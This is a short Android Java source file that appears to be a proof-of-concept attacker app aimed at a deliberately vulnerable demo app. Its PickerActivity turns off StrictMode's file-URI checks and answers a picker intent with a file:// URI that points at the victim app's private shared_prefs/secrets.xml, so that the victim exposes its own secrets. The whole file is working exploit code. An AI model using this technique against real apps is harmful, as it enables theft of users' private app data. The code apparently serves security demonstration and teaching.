package com.example.vulnapps.implicit_intents_poc;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;

public class PickerActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_picker);

        StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX);

        Uri uri = Uri.parse("file:///data/user/0/com.example.vulnapps.implicit_intents/shared_prefs/secrets.xml");
        setResult(-1, new Intent().setData(uri));
        finish();
    }
}